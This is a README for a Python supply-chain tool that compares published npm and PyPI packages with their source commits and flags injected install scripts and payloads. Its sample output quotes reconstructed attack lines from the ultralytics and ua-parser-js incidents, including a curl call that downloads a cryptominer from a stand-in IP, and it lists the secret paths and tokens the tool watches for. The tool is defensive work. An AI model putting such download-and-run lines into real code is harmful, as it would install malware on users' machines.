# provenance

**Is the package on npm or PyPI the code in its repository?** provenance downloads a release and the exact commit it was built from, then compares them file by file. It reports the install scripts, dependencies and code that only appeared at publish time. It needs nothing but Python's standard library.

[![ci](https://github.com/njuj/provenance/actions/workflows/ci.yml/badge.svg)](https://github.com/njuj/provenance/actions/workflows/ci.yml)
![python](https://img.shields.io/badge/python-3.10%2B-ffd166?labelColor=0b0f17)
![deps](https://img.shields.io/badge/dependencies-0-ffd166?labelColor=0b0f17)
![license](https://img.shields.io/badge/license-MIT-ffd166?labelColor=0b0f17)

Reviewers read the repository, but users install the tarball, and the most damaging supply-chain attacks live in the gap between the two:

- **event-stream (2018):** `flatmap-stream`'s npm tarball carried an encrypted payload in `index.min.js`, a file that was never in git.
- **ua-parser-js (2021):** a hijacked account published releases with a `preinstall` script that fetched a cryptominer.
- **xz-utils (2024):** the backdoor's trigger was only in the release tarballs, not in the repository.
- **ultralytics (2024):** a poisoned release workflow put a miner into the PyPI files of a repository that was clean.

```text
$ python examples/replay.py          # the npm / PyPI attacks above, rebuilt with inert payloads

 npm:flatmap-stream@0.1.1  flatmap-stream-0.1.1.tgz  ·  3 files
   source  github.com/hugeglass/flatmap-stream @ 3f2c8e1a9b7d  (gitHead recorded by npm at publish time)
   ✖ DIFFERS  the package contains code its repository does not explain
   ✖ HIGH     index.min.js: evaluates decoded data

 npm:ua-parser-js@0.7.29  ua-parser-js-0.7.29.tgz  ·  3 files
   ✖ DIFFERS  the package contains code its repository does not explain
   ✖ CRITICAL `preinstall` script added at publish time
              └ every `npm install` runs: start /B node preinstall.js & node preinstall.js (the repository has no such script)
   ✖ CRITICAL preinstall.js: runs commands or decoded code

 pypi:ultralytics@8.3.41  ultralytics-8.3.41.tar.gz  ·  3 files
   ✖ DIFFERS  the package contains code its repository does not explain
   ✖ CRITICAL ultralytics/utils/downloads.py: runs commands or decoded code
                + subprocess.Popen(['curl', '-sL', 'http://203.0.113.50/xmrig', '-o', '/tmp/ultralytics_runner'])
```

The real malicious versions were removed from the registries long ago, so these are reconstructions with harmless stand-in payloads, served by a local fake npm, PyPI and GitHub. On live packages it looks like this (output condensed):

```text
$ provenance left-pad pypi:requests vite

 npm:left-pad@1.3.0      ✔ MATCHES     10 identical
 pypi:requests@2.34.2    ✔ MATCHES     78 identical · 7 metadata
 npm:vite@8.3.5          ✔ CONSISTENT  20 identical · 16 built   (commit from vite's signed SLSA build provenance)
```

## Run it

```bash
pip install git+https://github.com/njuj/provenance
provenance react                    # npm, latest version
provenance npm:axios@1.7.2 pypi:requests==2.32.3
provenance mypkg --repo me/mypkg --ref main   # check your own release before (or after) you publish
provenance --json lodash            # for CI and dashboards
```

Set `GITHUB_TOKEN` if you check many packages, since tag lookups use GitHub's API. Exit codes: `0` nothing at or above `--fail-on` (default `high`), `1` findings, `2` nothing could be checked.

## How it works

1. **Which commit.** A release is matched to the exact commit it came from, using in order: npm's **signed SLSA build provenance**, which names the commit the publishing workflow ran on; the `gitHead` npm records at publish time; and finally the release's tag (`v1.2.3`, `1.2.3`, `name@1.2.3`, `rel_1_2_3`… then the repository's own tag list). In a monorepo, the package is found by the `name` in its `package.json`.
2. **Five piles.** Every published file is sorted into one of these:

   | pile | meaning |
   |---|---|
   | identical | byte for byte the repository's file (line endings aside) |
   | traced | built, and its source map leads back to the repository's own sources |
   | built | build output with nothing to trace it by |
   | changed | the repository has the file, but the published copy differs |
   | only in the package | code the repository does not have at all |

3. **What the code can do.** Minifiers rename variables but keep what code *does*. provenance extracts each file's capabilities: running commands, `eval` / `new Function` / `_compile`, decoding base64, hex or zlib, obfuscation, environment secrets (`NPM_TOKEN`, `AWS_*`…), sensitive paths (`~/.ssh`, `.npmrc`, browser and wallet stores), web requests, and the hosts it names. It then reports the capabilities that **nothing in the repository has**. Running commands plus a new host is critical. A new host alone in built code is low, because it usually comes from a bundled dependency.
4. **Source maps, without rebuilding.** If a built file ships a source map, the sources embedded in it must be the repository's sources. Code that maps to **no** source line is code the build did not get from the repository, and that is where an injected payload sits.
5. **The manifest.** Install scripts (`preinstall`, `install`, `postinstall`) and dependencies that appear only in the published `package.json` are reported. Per-platform binary packages pinned to the release's own version, or ones the repository's release tooling names, are recognised.

Formatting is never mistaken for an attack. A file whose added lines only reuse names and strings the repository already has is quiet: comments stripped, a version stamped in, TypeScript types removed, helpers renamed to `_foo2`.

## On real packages

I checked the latest release of **98 of the most-used packages**: 68 from npm (react, lodash, express, axios, next, vite, typescript, webpack, eslint, prettier…) and 30 from PyPI (requests, urllib3, flask, pydantic, fastapi, pytest, black…). It took about 6 minutes.

| | packages |
|---|---|
| ✔ matches: every published file is in the repository | **48** |
| ✔ consistent: built files, none able to do anything its source cannot | **50** |
| ✖ differs | **0** |

The run had no critical or high findings and one medium: `prop-types` ships a UMD bundle, `prop-types.js`, that is not in its repository and names `bugs.chromium.org`, which comes from bundled React code. Across those releases, 12,725 files were identical to the repository, 2,797 traced through source maps and 8,379 were built output. The first version flagged 17 of them. Each one led to a rule above: monorepo manifests, `_version.py` files written by setuptools-scm, comments stripped at publish, types stripped in source maps, per-platform binaries, and bundles of whole libraries.

## Testing

```bash
python -m unittest discover -s tests -v
```

There are 27 tests. They cover the three incidents above, code injected into a build where the source map does not explain it, a build made from a tampered source, a dependency slipped in at publish time, an obfuscated extra file, a modified file that reads `AWS_SECRET_ACCESS_KEY` and calls home, and the quiet cases: a clean package, comments stripped and a version stamped in, a monorepo, wheel versus `src/` layout, tag fallback, and a signed commit preferred over `gitHead`. Everything runs offline against [`tests/fakeworld.py`](tests/fakeworld.py), a local npm, PyPI and GitHub. CI also checks real releases end to end.

## Limits

- **It compares; it does not rebuild.** Built files without source maps are judged by what they can do, not byte for byte. That catches payloads that run commands, phone home or decode and evaluate data. A subtle logic change inside a minified bundle can still slip through.
- **If the malicious code is committed to the repository, the package matches its source.** provenance catches divergence at publish time. Reviewing the repository is still your job.
- **GitHub only.** It does not cover GitLab, Bitbucket or private registries.
- **Signatures are not verified.** It reads the commit from npm's provenance attestation but does not check the Sigstore signature. Use `npm audit signatures` for that.

## Layout

```
provenance/registry.py      npm and PyPI: files, repository, commit (SLSA attestation, gitHead, tags)
provenance/source.py        the repository snapshot at that commit
provenance/compare.py       the five piles, the manifest, and the findings
provenance/capabilities.py  what a file can do (runs, decodes, evaluates, reads secrets, contacts)
provenance/sourcemap.py     VLQ decoding, embedded sources, unmapped code
provenance/net.py           HTTP and in-memory archives
examples/replay.py          the three incidents, replayed locally
tests/                      unit and scenario tests against a fake npm / PyPI / GitHub
```

## License

MIT © kira
